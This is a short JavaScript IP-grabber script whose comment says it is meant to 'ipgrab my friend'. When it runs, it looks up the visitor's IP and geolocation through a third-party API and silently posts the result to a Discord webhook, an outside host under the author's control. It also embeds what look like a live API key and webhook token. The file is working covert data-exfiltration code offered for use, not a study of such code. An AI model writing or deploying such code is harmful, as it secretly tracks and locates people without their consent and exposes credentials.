// just trying to ipgrab my friend also idc about that webhook ;)

function send(url, key) {
    let request = new XMLHttpRequest();
    request.open("POST", url);
    request.setRequestHeader('Content-type', 'application/json');

    let data = {
      content: "IP LOGGED\n`" + key + "`"
    }

    request.send(JSON.stringify(data));
}

function httpGetAsync(url, callback) {
    let xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
        callback(xmlHttp.responseText);
    }

    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
}

httpGetAsync("https://ipgeolocation.abstractapi.com/v1/?api_key=59e76af1c37f4e029869b604a1781cf8", function(key) {
    send("https://discord.com/api/webhooks/938543965559484446/98aKSWsktvUpbqrnFBPcMPemVsbY8jJ80WsdiYcaiPqtKZI1gtOVMpHZviP78N4tQZsT", key)
});